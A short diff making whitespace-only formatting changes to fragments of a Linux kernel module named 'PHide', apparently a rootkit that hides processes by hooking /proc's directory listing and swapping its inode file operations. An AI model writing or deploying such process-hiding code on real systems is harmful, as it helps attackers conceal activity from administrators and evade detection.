@@ -27,7 +27,7 @@ static struct path p;
 struct dir_context *backup_ctx;
 
 static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
-        loff_t off, u64 ino, unsigned int d_type)
+                        loff_t off, u64 ino, unsigned int d_type)
 {
     if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
         return 0;
@@ -55,7 +55,7 @@ static int __init phide_init(void)
     printk(KERN_INFO "PHide: LKM succefully loaded!\n");
 
     /* fetch the procfs entry */
-    if(kern_path("/proc", 0, &p))
+    if (kern_path("/proc", 0, &p))
         return 0;
 
     /* get the inode*/
@@ -75,7 +75,7 @@ static int __init phide_init(void)
 
 static void __exit phide_exit(void)
 {
-    if(kern_path("/proc", 0, &p))
+    if (kern_path("/proc", 0, &p))
         return;
     proc_inode = p.dentry->d_inode;
     proc_inode->i_fop = backup_proc_fops;
